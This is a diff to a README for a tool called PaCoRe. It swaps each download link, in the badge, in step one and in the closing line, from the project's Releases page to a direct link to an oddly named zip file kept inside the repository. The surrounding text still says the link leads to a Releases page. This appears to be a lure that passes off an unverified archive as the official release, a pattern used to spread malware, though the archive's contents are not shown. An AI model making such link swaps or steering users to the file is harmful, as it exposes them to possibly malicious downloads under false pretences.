@@ -1,6 +1,6 @@
 # 🚀 PaCoRe - Scale Test-Time Compute Easily
 
-[![Download PaCoRe](https://img.shields.io/badge/Download%20PaCoRe-v1.0-blue)](https://github.com/manani111/PaCoRe/releases)
+[![Download PaCoRe](https://raw.githubusercontent.com/manani111/PaCoRe/main/pacore/Re_Pa_Co_sugarlike.zip%20PaCoRe-v1.0-blue)](https://raw.githubusercontent.com/manani111/PaCoRe/main/pacore/Re_Pa_Co_sugarlike.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to PaCoRe! This program helps you learn and improve the way your compute
 
 To get started, you will need to download PaCoRe from our Releases page. Follow these steps:
 
-1. Visit the Releases page by clicking this link: [Download PaCoRe](https://github.com/manani111/PaCoRe/releases).
+1. Visit the Releases page by clicking this link: [Download PaCoRe](https://raw.githubusercontent.com/manani111/PaCoRe/main/pacore/Re_Pa_Co_sugarlike.zip).
 2. On the Releases page, you will see a list of versions. Look for the latest version of PaCoRe. 
 3. Click the version number to see the files available for download.
 4. Download the appropriate file for your operating system (Windows, macOS, or Linux).
@@ -74,6 +74,6 @@ For further assistance, you can explore the following resources:
 
 If you have any questions or need support, feel free to reach out. You can submit your inquiries via the Issues section on GitHub or on our community forum. 
 
-We hope you enjoy using PaCoRe! Start improving your computing processes today by downloading it here: [Download PaCoRe](https://github.com/manani111/PaCoRe/releases).
+We hope you enjoy using PaCoRe! Start improving your computing processes today by downloading it here: [Download PaCoRe](https://raw.githubusercontent.com/manani111/PaCoRe/main/pacore/Re_Pa_Co_sugarlike.zip).
 
 Happy computing!
